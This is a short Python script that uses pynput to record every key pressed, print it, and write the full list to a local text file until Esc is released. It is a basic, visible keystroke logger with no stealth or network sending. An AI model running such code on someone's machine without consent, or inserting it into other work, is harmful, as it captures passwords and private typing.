
from pynput.keyboard import Key, Listener

from datetime import time

list1 = []

def on_press(key):
    print(key)
    list1.append(key)
    write_1(list1)


def write_1(list1):
    with open('file.txt','w') as f:
        for item in list1:
            item = str(item).replace("'","")

            f.write(item + " :  Key is Pressed...." )

            f.write("\n")

def on_release(key):
    if key == Key.esc:
        return False

with Listener (on_press = on_press, on_release = on_release) as l:
    l.join()
